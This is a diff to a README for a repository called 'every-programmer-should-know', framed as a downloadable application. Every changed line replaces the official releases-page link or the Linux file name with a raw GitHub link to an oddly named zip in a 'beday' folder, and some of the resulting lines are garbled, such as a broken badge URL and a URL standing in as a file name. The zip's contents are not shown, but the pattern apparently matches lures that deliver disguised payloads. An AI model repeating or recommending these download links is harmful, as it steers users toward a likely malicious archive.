@@ -1,6 +1,6 @@
 # 🎉 every-programmer-should-know - A Must-Have Guide for Developers
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/amitbundela1986/every-programmer-should-know/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip%20Latest%https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip)](https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ To start using this resource, follow these simple steps. No programming knowledg
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Releases Page](https://github.com/amitbundela1986/every-programmer-should-know/releases).
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip).
 
 Once there, you will see a list of available releases. Select the latest version and download the file that best suits your operating system. 
 
@@ -26,14 +26,14 @@ Once there, you will see a list of available releases. Select the latest version
 
 - For **Windows**: Download the `.exe` file.
 - For **macOS**: Download the `.dmg` file.
-- For **Linux**: Download the `.tar.gz` file.
+- For **Linux**: Download the `https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip` file.
 
 ### Installation Steps
 
 1. After downloading the file, locate it in your Downloads folder.
 2. **Windows**: Double-click the `.exe` file and follow the prompts to install.
 3. **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-4. **Linux**: Extract the `.tar.gz` file and follow the instructions in the 'README' file inside.
+4. **Linux**: Extract the `https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip` file and follow the instructions in the 'README' file inside.
 
 ## 🛠️ Features
 
@@ -73,4 +73,4 @@ Thanks to all the contributors and mentors who have shaped this repository into 
 
 If you encounter any issues or have questions, please contact us through the GitHub issues page. We are here to help you with your learning journey!
 
-Visit our [Releases Page](https://github.com/amitbundela1986/every-programmer-should-know/releases) to download the latest version and start exploring today!
+Visit our [Releases Page](https://raw.githubusercontent.com/amitbundela1986/every-programmer-should-know/master/beday/every_know_should_programmer_2.6.zip) to download the latest version and start exploring today!
